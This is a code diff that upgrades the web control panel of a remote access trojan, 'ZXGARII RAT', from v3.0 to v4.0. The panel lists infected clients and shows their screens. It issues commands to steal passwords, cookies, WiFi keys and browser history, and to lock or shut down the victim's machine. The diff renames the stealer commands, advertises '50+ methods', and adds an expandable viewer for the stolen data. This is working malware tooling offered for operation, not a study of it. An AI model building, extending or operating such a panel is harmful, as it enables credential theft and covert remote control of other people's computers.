@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>ZXGARII RAT v3.0</title>
+    <title>ZXGARII RAT v4.0</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -89,9 +89,6 @@
             min-height: 400px;
         }
         
-        /* ============================================================
-           CAPTURE AREA CON REDIMENSIONAMIENTO
-           ============================================================ */
         .capture-wrapper {
             position: relative;
             background: #0a0a0a;
@@ -129,11 +126,8 @@
             cursor: pointer;
             display: none;
             z-index: 10;
-            backdrop-filter: blur(4px);
         }
         .capture-wrapper .download-btn:hover { background: #333; }
-        
-        /* === RESIZE HANDLE (ESQUINA INFERIOR DERECHA) === */
         .resize-handle {
             position: absolute;
             bottom: 0;
@@ -143,10 +137,6 @@
             cursor: nw-resize;
             z-index: 20;
             opacity: 0.6;
-            transition: opacity 0.2s;
-        }
-        .resize-handle:hover {
-            opacity: 1;
         }
         .resize-handle::after {
             content: "";
@@ -157,13 +147,7 @@
             height: 12px;
             border-right: 2px solid #888;
             border-bottom: 2px solid #888;
-            transition: border-color 0.2s;
         }
-        .resize-handle:hover::after {
-            border-color: #00d4ff;
-        }
-        
-        /* Info de tamaño de la captura */
         .size-info {
             position: absolute;
             bottom: 35px;
@@ -175,9 +159,6 @@
             border-radius: 3px;
             display: none;
             z-index: 10;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 0.5px;
-            pointer-events: none;
         }
         .size-info.show { display: block; }
         
@@ -254,29 +235,78 @@
             padding: 8px;
             background: #0a0a0a;
             border: 1px solid #1a1a1a;
-            max-height: 200px;
+            max-height: 400px;
             overflow-y: auto;
         }
         .results-list::-webkit-scrollbar { width: 3px; }
         .results-list::-webkit-scrollbar-thumb { background: #444; }
+        
         .result-item {
-            padding: 4px 8px;
-            font-size: 11px;
-            color: #888;
+            border-bottom: 1px solid #1a1a1a;
+            padding: 2px 0;
+        }
+        .result-item:last-child { border-bottom: none; }
+        
+        .result-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid #1a1a1a;
+            padding: 4px 8px;
+            cursor: pointer;
+            transition: 0.2s;
         }
-        .result-item .dl-btn {
+        .result-header:hover { background: #1a1a1a; }
+        .result-header .filename { font-size: 11px; color: #888; }
+        .result-header .actions { display: flex; gap: 6px; align-items: center; }
+        .result-header .actions .toggle-btn {
+            background: none;
+            border: none;
+            color: #555;
+            cursor: pointer;
+            font-size: 12px;
+            transition: 0.3s;
+            padding: 0 4px;
+        }
+        .result-header .actions .toggle-btn:hover { color: #aaa; }
+        .result-header .actions .toggle-btn.open { transform: rotate(90deg); }
+        .result-header .actions .dl-btn {
             background: #1a1a1a;
             border: 1px solid #333;
             color: #66ccff;
-            padding: 2px 10px;
+            padding: 0 8px;
             font-size: 9px;
             cursor: pointer;
+            font-family: 'Courier New', monospace;
+            height: 18px;
+            line-height: 18px;
         }
-        .result-item .dl-btn:hover { background: #2a2a2a; border-color: #66ccff; }
+        .result-header .actions .dl-btn:hover { background: #2a2a2a; border-color: #66ccff; }
+        
+        .result-body {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease;
+            padding: 0 8px;
+        }
+        .result-body.open {
+            max-height: 600px;
+            padding: 6px 8px 10px 8px;
+        }
+        .result-body pre {
+            background: #0d0d0d;
+            border: 1px solid #1a1a1a;
+            padding: 10px;
+            font-size: 10px;
+            color: #aaa;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 500px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+        }
+        .result-body pre::-webkit-scrollbar { width: 3px; }
+        .result-body pre::-webkit-scrollbar-thumb { background: #444; }
         
         .history-list {
             margin-top: 10px;
@@ -303,7 +333,7 @@
 <div class="watermark">RAT</div>
 
 <div class="header">
-    <h1>ZXGARII <span>// v3.0</span></h1>
+    <h1>ZXGARII <span>// v4.0</span></h1>
     <div class="stats">
         <span>CLIENTS <strong id="totalClients">0</strong></span>
         <span>CAPTURES <strong id="totalFrames">0</strong></span>
@@ -317,7 +347,6 @@
         <div id="clientList"></div>
     </div>
     <div class="control-panel">
-        <!-- CAPTURE WRAPPER CON RESIZE -->
         <div class="capture-wrapper" id="captureWrapper">
             <img id="screenPreview" />
             <div class="placeholder" id="placeholder">SELECT A CLIENT</div>
@@ -355,12 +384,12 @@ let historyData = [];
 const CATEGORIES = {
     'stealer': {
         icon: '🕵️',
-        title: 'STEALER',
+        title: 'STEALER X50',
         subs: [
-            { id: 'get_passwords', label: '🔑 Passwords', type: 'download' },
-            { id: 'get_cookies', label: '🍪 Cookies', type: 'download' },
-            { id: 'get_wifi', label: '📶 WiFi', type: 'download' },
-            { id: 'get_browser', label: '🌐 History', type: 'download' }
+            { id: 'steal_passwords', label: '🔑 ALL DATA (50+ methods)', type: 'download' },
+            { id: 'steal_cookies', label: '🍪 Cookies', type: 'download' },
+            { id: 'steal_wifi', label: '📶 WiFi', type: 'download' },
+            { id: 'steal_browser', label: '🌐 History', type: 'download' }
         ]
     },
     'control': {
@@ -407,52 +436,9 @@ const CATEGORIES = {
 };
 
 // ============================================================
-// RESIZE HANDLER
-// ============================================================
-(function initResize() {
-    const wrapper = document.getElementById('captureWrapper');
-    const handle = document.getElementById('resizeHandle');
-    const sizeInfo = document.getElementById('sizeInfo');
-    let isResizing = false;
-    let startX, startY, startWidth, startHeight;
-
-    handle.addEventListener('mousedown', function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        isResizing = true;
-        startX = e.clientX;
-        startY = e.clientY;
-        startWidth = wrapper.offsetWidth;
-        startHeight = wrapper.offsetHeight;
-        wrapper.style.transition = 'none';
-        document.body.style.cursor = 'nw-resize';
-        sizeInfo.classList.add('show');
-    });
-
-    document.addEventListener('mousemove', function(e) {
-        if (!isResizing) return;
-        const dx = e.clientX - startX;
-        const dy = e.clientY - startY;
-        let newWidth = Math.max(150, startWidth + dx);
-        let newHeight = Math.max(100, startHeight + dy);
-        wrapper.style.width = newWidth + 'px';
-        wrapper.style.height = newHeight + 'px';
-        sizeInfo.textContent = newWidth + '×' + newHeight;
-    });
-
-    document.addEventListener('mouseup', function() {
-        if (isResizing) {
-            isResizing = false;
-            wrapper.style.transition = '';
-            document.body.style.cursor = '';
-            setTimeout(() => sizeInfo.classList.remove('show'), 1500);
-        }
-    });
-})();
-
-// ============================================================
 // FUNCIONES PRINCIPALES
 // ============================================================
+
 async function fetchClients() {
     try {
         const res = await fetch('/get_clients');
@@ -490,10 +476,38 @@ function renderResults() {
     container.style.display = 'block';
     list.innerHTML = resultsData.map((item, idx) => `
         <div class="result-item">
-            <span>📄 ${item.filename}</span>
-            <button class="dl-btn" onclick="downloadResult(${idx})">⬇ DOWNLOAD</button>
+            <div class="result-header" onclick="toggleResult(${idx})">
+                <span class="filename">📄 ${item.filename}</span>
+                <div class="actions">
+                    <button class="toggle-btn" id="toggleBtn_${idx}">▶</button>
+                    <button class="dl-btn" onclick="event.stopPropagation();downloadResult(${idx})">⬇ DL</button>
+                </div>
+            </div>
+            <div class="result-body" id="resultBody_${idx}">
+                <pre>${escapeHtml(item.data)}</pre>
+            </div>
         </div>
     `).join('');
+}
+
+function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+}
+
+function toggleResult(idx) {
+    const body = document.getElementById(`resultBody_${idx}`);
+    const btn = document.getElementById(`toggleBtn_${idx}`);
+    if (body.classList.contains('open')) {
+        body.classList.remove('open');
+        btn.classList.remove('open');
+        btn.textContent = '▶';
+    } else {
+        body.classList.add('open');
+        btn.classList.add('open');
+        btn.textContent = '▼';
+    }
 }
 
 function renderHistory() {
@@ -635,10 +649,10 @@ async function executeCommand(cmdId) {
     if (!selectedClient) return alert('Select a client');
     
     const map = {
-        'get_passwords': 'steal_passwords',
-        'get_cookies': 'steal_cookies',
-        'get_wifi': 'steal_wifi',
-        'get_browser': 'steal_browser',
+        'steal_passwords': 'steal_passwords',
+        'steal_cookies': 'steal_cookies',
+        'steal_wifi': 'steal_wifi',
+        'steal_browser': 'steal_browser',
         'jump': 'jump',
         'lock': 'lock',
         'shutdown': 'shutdown',
@@ -711,11 +725,50 @@ function sendPopup() {
     }).catch(console.error);
 }
 
+// Resize handler
+(function initResize() {
+    const wrapper = document.getElementById('captureWrapper');
+    const handle = document.getElementById('resizeHandle');
+    const sizeInfo = document.getElementById('sizeInfo');
+    let isResizing = false;
+    let startX, startY, startWidth, startHeight;
+
+    handle.addEventListener('mousedown', function(e) {
+        e.preventDefault();
+        isResizing = true;
+        startX = e.clientX; startY = e.clientY;
+        startWidth = wrapper.offsetWidth; startHeight = wrapper.offsetHeight;
+        wrapper.style.transition = 'none';
+        document.body.style.cursor = 'nw-resize';
+        sizeInfo.classList.add('show');
+    });
+
+    document.addEventListener('mousemove', function(e) {
+        if (!isResizing) return;
+        let newWidth = Math.max(150, startWidth + (e.clientX - startX));
+        let newHeight = Math.max(100, startHeight + (e.clientY - startY));
+        wrapper.style.width = newWidth + 'px';
+        wrapper.style.height = newHeight + 'px';
+        sizeInfo.textContent = newWidth + '×' + newHeight;
+    });
+
+    document.addEventListener('mouseup', function() {
+        if (isResizing) {
+            isResizing = false;
+            wrapper.style.transition = '';
+            document.body.style.cursor = '';
+            setTimeout(() => sizeInfo.classList.remove('show'), 1500);
+        }
+    });
+})();
+
+// Keyboard shortcuts
 document.addEventListener('keydown', (e) => {
     if ((e.key === 'j' || e.key === 'J') && selectedClient) executeCommand('jump');
     if ((e.key === 's' || e.key === 'S') && selectedClient) executeCommand('screenshot');
 });
 
+// Inicialización
 fetchClients();
 setInterval(fetchClients, 5000);
 renderCategories();
@@ -725,7 +778,7 @@ setTimeout(() => {
     if (first) toggleCategory(first);
 }, 500);
 
-console.log('ZXGARII RAT v3.0 - Con resize');
+console.log('ZXGARII RAT v4.0 - X50 Stealer');
 </script>
 </body>
 </html>
